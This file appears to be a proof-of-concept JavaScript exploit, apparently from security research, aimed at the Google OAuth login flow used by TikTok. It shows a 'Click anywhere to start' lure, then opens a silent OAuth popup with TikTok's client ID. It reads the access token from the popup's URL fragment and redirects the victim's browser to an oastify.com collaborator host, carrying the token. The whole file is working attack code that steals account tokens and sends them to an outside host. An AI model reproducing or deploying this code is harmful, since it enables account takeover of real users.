document.body.innerHTML = '<h1 style="text-align:center;margin-top:20%">Click anywhere to start</h1>';
document.body.style.cursor = 'pointer';
document.body.style.textAlign = 'center';
document.body.style.fontFamily = 'Arial, sans-serif';

document.body.addEventListener('click', function () {
    const newWindow = window.open('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?platform=google&client_id=1096011445005-sdea0nf5jvj14eia93icpttv27cidkvk.apps.googleusercontent.com&response_type=token&redirect_uri=https%3A%2F%2Fus.tiktok.com%2Flogin%2F&state=%7B%22client_id%22%3A%221096011445005-sdea0nf5jvj14eia93icpttv27cidkvk.apps.googleusercontent.com%22%2C%22network%22%3A%22google%22%2C%22display%22%3A%22popup%22%2C%22callback%22%3A%22_hellojs_3btmxkn%22%2C%22state%22%3A%22%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%22%2C%22scope%22%3A%22basic%22%7D&scope=openid%20profile&prompt=none&service=lso&o2v=2&ddm=1&flowName=GeneralOAuthFlow', '_blank');
    
    setTimeout(() => {
        if (newWindow) {
            try {
                const newWindowLocation = newWindow.location.href;
                newWindow.close();
                
                // Extract hash from the URL
                const hashIndex = newWindowLocation.indexOf('#');
                let queryParams = '';
                if (hashIndex !== -1) {
                    const hash = newWindowLocation.substring(hashIndex + 1);
                    queryParams = new URLSearchParams({ token: hash }).toString();
                }
                
                location = `https://839xk91bqq1do1b501vxm3pal1rsfj38.oastify.com/?${queryParams}`;
            } catch (e) {
                console.log('Unable to access new window location. Possible cross-origin restriction.');
            }
        } else {
            console.log('Failed to open a new window. Please check pop-up blocker settings.');
        }
    }, 2000);
});